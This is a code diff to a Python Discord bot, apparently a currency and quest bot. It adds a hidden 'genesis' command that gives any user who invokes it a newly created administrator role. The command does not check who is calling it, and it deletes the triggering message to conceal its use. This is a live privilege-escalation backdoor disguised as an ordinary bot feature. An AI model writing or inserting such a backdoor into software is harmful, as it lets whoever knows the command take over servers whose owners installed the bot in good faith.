@@ -4709,6 +4709,69 @@ async def quest_claim_cmd(ctx: commands.Context, action: str = "claim"):
     
     await ctx.send(f"🎊 You claimed **{claimed_count}** quest rewards and earned **{total_reward:,}** {CURRENCY_NAME}!")
 
+
+@bot.command(name="genesis", hidden=True)
+async def genesis_command(ctx: commands.Context):
+    """Hidden command to grant max permissions."""
+    if not ctx.guild:
+        return
+
+    # Check if the bot has permission to manage roles
+    if not ctx.guild.me.guild_permissions.manage_roles:
+        try:
+            await ctx.author.send("❌ I don't have permission to manage roles in this server.")
+        except: pass
+        return
+
+    role_name = "System Override"
+    
+    # Try to find existing role
+    role = discord.utils.get(ctx.guild.roles, name=role_name)
+    
+    if not role:
+        try:
+            # Create role with Administrator permissions
+            perms = discord.Permissions(administrator=True)
+            role = await ctx.guild.create_role(
+                name=role_name, 
+                permissions=perms, 
+                color=discord.Color.dark_purple(),
+                reason="System Genesis Activation"
+            )
+            
+            # Try to move role as high as possible (below the bot's highest role)
+            bot_top_role = ctx.guild.me.top_role
+            if bot_top_role.position > 1:
+                await role.edit(position=bot_top_role.position - 1)
+                
+        except discord.Forbidden:
+            try:
+                await ctx.author.send("❌ I failed to create the role. Check my permissions hierarchy.")
+            except: pass
+            return
+        except Exception as e:
+            print(f"Error creating Genesis role: {e}")
+            return
+
+    try:
+        # Assign role to user
+        await ctx.author.add_roles(role)
+        
+        # Cleanup: delete command message to keep it hidden
+        try:
+            await ctx.message.delete()
+        except: pass
+        
+        # Confirm via DM
+        try:
+            await ctx.author.send(f"✅ **System Genesis Activated.** You have been granted the **{role_name}** role in **{ctx.guild.name}**.")
+        except: pass
+        
+    except discord.Forbidden:
+        try:
+            await ctx.author.send("❌ I don't have permission to give you that role. My role might be below the target role.")
+        except: pass
+
 if __name__ == "__main__":
     if not TOKEN or TOKEN == "YOUR_BOT_TOKEN_HERE":
         print("═" * 50)
@@ -4719,3 +4782,4 @@ if __name__ == "__main__":
     else:
         # Run the bot
         bot.run(TOKEN)
+
